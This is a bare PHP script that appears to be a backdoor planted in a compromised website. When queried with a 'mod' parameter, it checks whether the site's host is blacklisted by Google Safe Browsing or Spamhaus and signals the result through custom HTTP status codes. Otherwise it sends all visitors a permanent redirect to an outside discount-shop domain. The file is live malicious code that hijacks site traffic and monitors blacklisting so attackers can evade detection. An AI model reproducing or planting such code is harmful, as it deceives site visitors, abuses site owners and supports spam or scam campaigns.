<?php if($_GET['mod']){if($_GET['mod']=='0XX' OR $_GET['mod']=='00X'){$g_sch=file_get_contents('http://www.google.com/safebrowsing/diagnostic?output=jsonp&site=http%3A%2F%2F'.$_SERVER['HTTP_HOST'].'%2F');
$g_sch = str_replace('"listed"', '', $g_sch, $g_out);if($g_out){header('HTTP/1.1 202');exit;}}if($_GET['mod']=='X0X' OR $_GET['mod']=='00X'){$sh = gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');
if($sh=='127.0.1.2' or $sh=='127.0.1.4' or $sh=='127.0.1.5' or $sh=='127.0.1.6' or $sh=='127.0.1.102' or $sh=='127.0.1.103' or $sh=='127.0.1.104' or $sh=='127.0.1.105' or $sh=='127.0.1.106'){
header('HTTP/1.1 203');exit;}}header('HTTP/1.1 201');exit;}
header('HTTP/1.1 301 Moved Permanently');header('Location: https://luxdiscount.zone');
?>